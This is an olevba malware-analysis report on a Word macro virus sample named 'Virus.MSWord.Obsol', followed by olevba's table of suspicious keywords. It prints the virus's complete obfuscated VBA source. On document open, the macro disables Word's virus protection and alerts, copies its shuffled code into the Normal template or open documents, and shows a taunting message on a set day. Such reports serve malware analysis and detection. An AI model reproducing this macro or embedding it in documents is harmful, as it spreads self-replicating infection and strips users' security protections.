olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Obsol
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Obsol - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next: Dim °(30) As String: GoTo ¤23
¤03: © = ¥.CountOfLines - ¾: GoTo ¤04
¤04: ð = ð + Þ: GoTo ¤05
¤05: ñ = ø: õ = ø: ª = Int(Rnd * (© - ð) + Þ): GoTo ¤06
¤06: If °(õ + Þ) = "" Then GoTo ¤07 Else GoTo ¤08
¤07: ñ = ñ + Þ: GoTo ¤08
¤08: õ = õ + Þ: GoTo ¤09
¤09: If ñ < ª Then GoTo ¤06 Else GoTo ¤10
¤10: °(õ) = ¥.Lines((© + ¾) - ð, Þ): GoTo ¤11
¤11: If ð = © Then GoTo ¤12 Else GoTo ¤04
¤12: For å = Þ To ©: ¢ = ¢ & °(å) & vbCr: Next: GoTo ¤17
¤13: If MacroContainer = ActiveDocument Then Set ± = NormalTemplate Else Set ± = ActiveDocument: GoTo ¤14
¤14: Set § = ±.VBProject.VBComponents(Þ).CodeModule: GoTo ¤15
¤15: Set ¥ = ThisDocument.VBProject.VBComponents(Þ).CodeModule: GoTo ¤16
¤16: If Len(¥.Lines(Þ, ¥.CountOfLines)) <> Len(§.Lines(Þ, §.CountOfLines)) Then GoTo ¤03 Else GoTo ¤24
¤17: §.DeleteLines Þ, §.CountOfLines: GoTo ¤18
¤18: §.InsertLines Þ, ¥.Lines(Þ, ½) & vbCr & ¢: GoTo ¤19
¤19: §.DeleteLines §.CountOfLines, Þ: GoTo ¤20
¤20: §.InsertLines §.CountOfLines + Þ, ¥.Lines(¥.CountOfLines, Þ): GoTo ¤21
¤21: If ± = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName: GoTo ¤24
¤22: With Application: .Options.VirusProtection = ø: .Options.SaveNormalPrompt = ø: .DisplayStatusBar = ø: .EnableCancelKey = ø: .DisplayAlerts = ø: End With: GoTo ¤13
¤23: ø = Asc(Chr(65)) - Asc(Chr(65)): Þ = Asc(Chr(66)) - Asc(Chr(65)): ½ = Asc(Chr(67)) - Asc(Chr(65)): ¾ = Asc(Chr(68)) - Asc(Chr(65)): « = Asc(Chr(96)) - Asc(Chr(65)): GoTo ¤22
¤24: If Day(Now()) = « Then GoTo ¤25 Else GoTo ¤26
¤25: MsgBox Application.UserName & " has become obsolete.", ø, "Class.Obsolete": GoTo ¤26
¤26: Exit Sub
End Sub 'Class.Obsolete written by jackie
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

